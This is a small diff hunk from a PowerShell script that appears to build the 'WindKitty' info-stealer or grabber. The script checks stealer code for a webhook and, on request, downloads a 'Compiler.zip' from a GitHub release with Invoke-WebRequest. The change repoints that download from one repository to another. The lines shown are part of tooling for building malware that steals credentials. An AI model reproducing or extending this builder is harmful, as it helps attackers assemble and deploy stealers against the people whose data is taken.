@@ -18,7 +18,7 @@ if ($rawstealer -match $hook) {
     
     if ($compile -eq 'y' -or $compile -eq 'Y') {
         Write-Host "[+] Downloading Compiler.. You need to compile it yourself." -ForegroundColor Magenta
-        $url = "https://github.com/WindKitty/WindKitty-Stealer/releases/download/windkittycompiler/Compiler.zip"
+        $url = "https://github.com/EvilBytecode/WindKitty-Powershell-Grabber/releases/download/compiler/Compiler.zip"
         $dest = "$env:USERPROFILE\Downloads"
 
         Invoke-WebRequest -Uri $url -OutFile (Join-Path $dest "Compiler.zip")
